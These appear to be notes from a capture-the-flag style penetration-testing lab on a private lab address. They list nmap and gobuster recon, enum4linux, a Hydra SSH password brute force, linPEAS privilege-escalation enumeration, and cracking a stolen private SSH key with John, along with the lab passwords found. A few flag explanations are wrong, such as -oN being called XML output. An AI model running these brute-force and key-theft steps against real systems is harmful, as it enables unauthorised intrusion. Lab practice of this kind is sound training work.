# Basic Pentesting

IP: 10.10.86.137

# Ran Nmap Scan
# nmap -sC -sV -oN nmap/initial 
# -sC: Script scan with default set of scripts
# -sV: Version Scanning
# -oN: Output in XML

Open Ports: 22(SSH), 80(HTTP), 139(Samba), 445(Samba)
Hostname: BASIC2

# Checked 10.10.86.137 page

# Ran gobuster to brute force URL
# gobuster dir -u http://10.10.86.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
# gobuster [mode] -u [target ip] -w [wordlist]

Found /development
/development/dev.txt informed us it is using Apache 2.5.12 (insecure)
/devlopment/j.txt informed us of /etc/shadow and user J had weak credentials

# Ran enum4linux to enumerate information from Windows & Samba machines
# enum4linux -a 10.10.86.137 | tee enum4linux.log
# -a: does everything in enum4linux
# tee enum4linux.log: saving output to log file

Found User\kay & User\jan

# Ran Hydra to brute force password as it is weak
# hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.86.137
# -l: attempt to login as root user
# -P: use a password list

Found the password armando for jan

# SSH'd into jan's machine for manual investigation

# Secure Copied linPEAS to Jan's machine
# scp ~/linPEAS/linpeas.sh jan@10.10.86.137:/dev/shm

# Ran linpeas for priveledge escalation
# ./linpeas.sh | tee linlog.txt

Found private SSH Key /home/kay/.ssh/id_rsa & saved to kay_id_rsa

# Ran JohnTheRipper to find the password of the rsa key
# ~/john/JohnTheRipper/run/ssh2john.py kay_id_rsa > forjohn.txt
# ~/john/JohnTheRipper/run/john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.text.gz

password found to be beeswax

# ssh into Kay
# ssh -i kay_id_rsa kay@10.10.86.137

# Ran ls -la to check home directory of Kay

found pass.bak
